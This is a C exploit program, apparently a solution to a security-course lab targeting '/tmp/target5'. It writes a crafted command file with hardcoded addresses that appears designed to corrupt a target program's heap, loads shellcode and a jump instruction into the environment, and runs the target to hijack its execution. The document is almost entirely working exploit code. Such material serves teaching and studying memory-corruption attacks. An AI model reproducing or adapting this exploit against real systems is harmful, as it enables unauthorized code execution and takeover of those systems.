#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"
#include <fcntl.h>

#define TARGET "/tmp/target5"

int main(void)
{
	int fd;
	char cmd[26];
	char arg1[] = "sploit5-cmds";
	char *args[] = { TARGET, arg1, NULL };
	char shell[38];
	char j[5];
	strcpy(shell, shellcode);
	*(unsigned*)(&j) = 0xeafffff3; //26
	shell[37]='\0';
        j[4]='\0';	
	char *env[] = { shellcode, "AAAAA", j, NULL };
	
	fd = open(arg1, O_CREAT | O_RDWR, 0666);
	write(fd, "create 0 aaaa\n", 14);
	write(fd, "create 1 aaaaaa\n", 16);
	write(fd, "create 2 aaaaaaaaaaaaaaaaaaaaaaaaaaa\n", 37);
	write(fd, "combine 2 1 2\n", 14);
	write(fd, "create 0 aaaaaaaa\xea\xff\xff\xbe\x8d\xfd\xff\xbe\n", 26);
	write(fd, "delete 1\n", 9);
	close(fd);

	
	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
